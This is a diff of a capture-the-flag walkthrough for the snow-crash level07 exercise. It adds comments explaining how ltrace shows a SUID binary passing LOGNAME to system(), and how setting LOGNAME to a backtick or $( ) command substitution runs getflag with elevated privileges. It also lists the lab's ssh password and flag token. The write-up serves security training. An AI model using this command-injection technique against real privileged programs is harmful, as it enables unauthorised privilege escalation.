@@ -8,9 +8,18 @@ Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
 
 
+# Login as level07.
 ┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level07
 level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
+# An SUID executable is located in home directory.
+level07@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+# Seems to print executable name argv[0]?
+level07@SnowCrash:~$ ./level07
+level07
+# Use ltrace to intercept dynamic library calls and system calls executed by the program.
 level07@SnowCrash:~$ ltrace ./level07
 __libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
 getegid()                                                                                                                                          = 2007
@@ -24,6 +33,10 @@ system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                                                                             = 0
 +++ exited (status 0) +++
+# Programs calls getenv() which searches the environment list to find the environment variable LOGNAME.
+# Change environment variable LOGNAME with command substition by escaping backticks if using with double quotes.
 level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
+#level07@SnowCrash:~$ export LOGNAME='`getflag`'
+#level07@SnowCrash:~$ export LOGNAME='$(getflag)'
 level07@SnowCrash:~$ ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
